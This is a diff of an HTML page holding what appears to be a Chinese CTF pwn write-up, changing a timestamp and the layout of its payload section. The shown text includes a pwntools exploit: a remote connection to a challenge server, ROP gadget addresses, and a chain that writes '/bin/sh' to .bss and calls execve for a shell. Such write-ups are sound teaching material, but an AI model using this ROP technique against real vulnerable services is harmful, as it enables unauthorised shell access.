@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://example.com/images/pwn7-1.png">
 <meta property="og:image" content="http://example.com/images/pwn7-2.png">
 <meta property="article:published_time" content="2023-09-20T07:45:10.000Z">
-<meta property="article:modified_time" content="2023-09-20T08:37:13.628Z">
+<meta property="article:modified_time" content="2023-09-20T08:39:55.347Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/pwn7-1.png">
@@ -330,9 +330,9 @@
 <p>根据上面总结的基础知识，execave的第一个参数（’&#x2F;bin&#x2F;sh’）放在rdi中，第二个和第三个参数0需放在rsi,rdx。系统调用号（59）存放在rax中 .</p>
 <p>利用ROPgadget 分别查找pop_rdi，pop_rsi,pop_rdx，pop_raxd的地址。</p>
 <p>由于程序中不存在“&#x2F;bin&#x2F;sh”,在这里需要用read函数将’&#x2F;bin&#x2F;sh’写入一个可写可执行段.bss段，根据上面提到的方法查找bss段。</p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">payload=padding + read(<span class="hljs-number">0</span>,<span class="hljs-keyword">bss_addr,len(‘/bin/sh\x00’)) </span>+ sysread_id + <span class="hljs-keyword">syscall_addr </span>+execave(<span class="hljs-keyword">bss_addr,0,0) </span>+ sysexecave_id +<span class="hljs-keyword">syscall_addr</span><br><span class="hljs-keyword"></span>```                         <br>可以与下面exp对照来看。<br><span class="hljs-comment">### 完整exp</span><br><br></code></pre></td></tr></table></figure>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">payload=padding + read(<span class="hljs-number">0</span>,<span class="hljs-keyword">bss_addr,len(‘/bin/sh\x00’)) </span>+ sysread_id + <span class="hljs-keyword">syscall_addr </span>+execave(<span class="hljs-keyword">bss_addr,0,0) </span>+ sysexecave_id +<span class="hljs-keyword">syscall_addr</span><br><span class="hljs-keyword"></span>```                         <br>可以与下面exp对照来看。<br><br><span class="hljs-comment">### 完整exp</span><br><br><br></code></pre></td></tr></table></figure>
 <p>from pwn import *</p>
-<h1 id="创建一个远程连接"><a href="#创建一个远程连接" class="headerlink" title="创建一个远程连接"></a>创建一个远程连接</h1><p>r &#x3D; remote(‘vps1.blue-whale.me’,19900)</p>
+<p>r &#x3D; remote(‘vps1.blue-whale.me’,19900)</p>
 <p>pop_rdi&#x3D;0x0000000000400686<br>pop_rsi&#x3D;0x00000000004101f3<br>pop_rdx&#x3D;0x00000000004498b5<br>pop_rax&#x3D;0x0000000000415664<br>syscall_addr &#x3D; 0x0000000000474E65<br>bss_addr &#x3D; 0x00000000006bb2e0</p>
 <p>payload &#x3D; b’a’*0x400 + b’b’*0x8 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(8) + p64(pop_rax) + p64(0) + p64(syscall_addr)</p>
 <p>payload +&#x3D; p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall_addr)</p>
